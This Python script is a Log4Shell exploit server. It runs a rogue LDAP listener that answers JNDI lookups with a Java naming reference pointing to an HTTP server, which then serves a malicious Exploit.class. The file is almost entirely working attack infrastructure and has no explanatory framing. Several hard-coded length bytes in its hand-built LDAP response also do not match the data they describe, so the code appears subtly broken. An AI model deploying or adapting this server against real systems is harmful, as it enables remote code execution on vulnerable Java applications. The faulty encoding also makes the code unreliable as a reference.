#!/usr/bin/env python3
import socket
import sys
from threading import Thread
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os

class LDAPExploitServer:
    def __init__(self, ldap_port=1389, http_port=8888):
        self.ldap_port = ldap_port
        self.http_port = http_port

    def ldap_server(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.ldap_port))
        sock.listen(5)
        print(f'[+] LDAP Server listening on 0.0.0.0:{self.ldap_port}')

        while True:
            conn, addr = sock.accept()
            print(f'[*] LDAP Connection from {addr[0]}:{addr[1]}')

            try:
                # Read LDAP bind request
                conn.recv(8192)

                # Send LDAP bind response (success)
                bind_response = b'0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00'
                conn.send(bind_response)

                # Read LDAP search request
                conn.recv(8192)

                # Build LDAP search result with Java object reference
                # This is the critical part - proper LDAP response with javaCodebase

                # SearchResultEntry with attributes
                search_entry = bytearray([
                    0x30, 0x81, 0xdc,  # Sequence
                    0x02, 0x01, 0x02,  # MessageID: 2
                    0x64, 0x81, 0xd6,  # SearchResultEntry
                    0x04, 0x14,  # Object name
                ])

                # Add object name
                search_entry.extend(b'cn=Exploit,dc=example')

                # Attributes sequence
                search_entry.extend([0x30, 0x81, 0xbb])

                # javaClassName attribute
                search_entry.extend([
                    0x30, 0x3f,  # Sequence
                    0x04, 0x0d,  # Type
                ])
                search_entry.extend(b'javaClassName')
                search_entry.extend([0x31, 0x2e])  # Set of values
                search_entry.extend([0x04, 0x07])
                search_entry.extend(b'Exploit')
                search_entry.extend([0x04, 0x23])
                search_entry.extend(b'http://localhost:' + str(self.http_port).encode() + b'/Exploit')

                # javaCodeBase attribute
                search_entry.extend([
                    0x30, 0x39,  # Sequence
                    0x04, 0x0c,  # Type
                ])
                search_entry.extend(b'javaCodeBase')
                search_entry.extend([0x31, 0x29])  # Set of values
                search_entry.extend([0x04, 0x27])
                search_entry.extend(b'http://localhost:' + str(self.http_port).encode() + b'/')

                # objectClass attribute
                search_entry.extend([
                    0x30, 0x22,  # Sequence
                    0x04, 0x0b,  # Type
                ])
                search_entry.extend(b'objectClass')
                search_entry.extend([0x31, 0x13])  # Set of values
                search_entry.extend([0x04, 0x11])
                search_entry.extend(b'javaNamingReference')

                # javaFactory attribute
                search_entry.extend([
                    0x30, 0x1b,  # Sequence
                    0x04, 0x0b,  # Type
                ])
                search_entry.extend(b'javaFactory')
                search_entry.extend([0x31, 0x0c])  # Set of values
                search_entry.extend([0x04, 0x07])
                search_entry.extend(b'Exploit')
                search_entry.extend([0x04, 0x01])
                search_entry.extend(b' ')

                conn.send(bytes(search_entry))
                print('[*] Sent LDAP SearchResultEntry')

                # Send SearchResultDone
                search_done = b'0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00'
                conn.send(search_done)
                print('[*] Sent LDAP SearchResultDone')

            except Exception as e:
                print(f'[!] LDAP Error: {e}')
            finally:
                conn.close()

    def http_server(self):
        os.chdir(os.path.dirname(os.path.abspath(__file__)))

        class Handler(SimpleHTTPRequestHandler):
            def do_GET(self):
                if 'Exploit.class' in self.path:
                    print(f'[*] HTTP request for Exploit.class from {self.client_address[0]}')
                    try:
                        with open('Exploit.class', 'rb') as f:
                            content = f.read()
                        self.send_response(200)
                        self.send_header('Content-Type', 'application/octet-stream')
                        self.send_header('Content-Length', str(len(content)))
                        self.end_headers()
                        self.wfile.write(content)
                        print(f'[+] Sent Exploit.class ({len(content)} bytes)')
                        print('[!!!] CHECK FOR CALC.EXE - EXPLOIT DELIVERED!')
                    except:
                        self.send_error(404)
                else:
                    super().do_GET()

            def log_message(self, format, *args):
                return  # Suppress logs

        httpd = HTTPServer(('0.0.0.0', self.http_port), Handler)
        print(f'[+] HTTP Server listening on 0.0.0.0:{self.http_port}')
        httpd.serve_forever()

    def run(self):
        print('='*50)
        print('Log4Shell LDAP Exploit Server')
        print('='*50)

        # Start LDAP server in thread
        ldap_thread = Thread(target=self.ldap_server)
        ldap_thread.daemon = True
        ldap_thread.start()

        # Start HTTP server
        self.http_server()

if __name__ == '__main__':
    server = LDAPExploitServer()
    server.run()